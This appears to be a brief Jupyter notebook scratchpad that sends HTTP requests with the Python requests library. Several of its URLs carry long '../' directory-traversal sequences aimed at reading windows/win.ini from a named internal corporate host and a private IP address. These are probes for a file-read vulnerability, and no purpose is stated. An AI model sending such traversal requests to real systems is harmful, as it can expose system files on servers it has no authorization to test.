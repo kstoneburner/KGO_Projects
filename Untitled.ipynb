{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "561f5f91",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "57a2bc51",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://kgotv-dlmos01.swna.wdpr.disney.com/../../../../../../../../../../../../windows/win.ini\"\n",
    "url = \"http://kgotv-dlmos01.swna.wdpr.disney.com/../../../../../../../../../../../../windows/win.ini%20\"\n",
    "url = \"http://172.24.132.148/../../../../../../../../../../../../windows/win.ini%20\"\n",
    "url = \"http://172.24.132.148\"\n",
    "response = requests.get(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a64acf9",
   "metadata": {},
   "outputs": [],
   "source": [
    "response.text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
